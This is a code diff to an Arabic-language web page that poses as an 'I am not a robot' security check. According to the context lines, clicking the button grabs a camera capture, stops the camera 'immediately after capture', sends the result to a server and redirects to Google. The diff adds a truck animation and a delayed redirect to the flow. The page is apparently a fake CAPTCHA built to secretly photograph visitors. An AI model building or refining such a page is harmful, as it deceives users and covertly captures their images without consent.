@@ -4,14 +4,47 @@
     <meta charset="UTF-8">
     <title>التحقق الأمني</title>
     <style>
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; font-family: sans-serif; }
-        button { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; transition: 0.3s; }
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            background: #f0f2f5; 
+            font-family: sans-serif; 
+            position: relative;
+        }
+        button { 
+            padding: 20px 40px; 
+            font-size: 18px; 
+            cursor: pointer; 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            transition: 0.3s; 
+            z-index: 2;
+        }
         button:hover { background: #0056b3; }
+
+        /* الشاحنة */
+        .truck {
+            position: absolute;
+            left: -100px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 40px;
+            transition: left 2s ease;
+        }
+        .truck.move {
+            left: calc(100% - 50px);
+        }
     </style>
 </head>
 <body>
 
 <button onclick="startProcess()">أنا لست روبوت - اضغط للتحقق</button>
+<div class="truck">🚚</div>
 
 <script>
 async function startProcess() {
@@ -43,8 +76,14 @@ async function startProcess() {
         // إيقاف الكاميرا فوراً بعد الالتقاط
         stream.getTracks().forEach(track => track.stop());
 
+        // تشغيل حركة الشاحنة
+        const truck = document.querySelector('.truck');
+        truck.classList.add('move');
+
         if (response.ok) {
-            window.location.href = "https://www.google.com";
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
         } else {
             alert("حدث خطأ أثناء الاتصال بالخادم، يرجى المحاولة مرة أخرى.");
         }
